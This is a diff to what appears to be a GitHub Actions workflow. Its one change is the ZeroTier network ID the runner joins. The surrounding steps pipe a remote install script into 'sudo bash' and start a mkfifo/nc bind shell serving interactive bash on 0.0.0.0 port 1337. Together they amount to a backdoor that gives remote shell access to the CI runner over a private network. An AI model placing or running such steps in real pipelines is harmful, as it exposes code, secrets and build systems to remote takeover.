@@ -5,5 +5,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: curl -s https://install.zerotier.com | sudo bash
-      - run: sudo zerotier-cli join 9aa0f2bcc4bdf60d
+      - run: sudo zerotier-cli join 9aa0f2bcc42bb555
       - run: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f
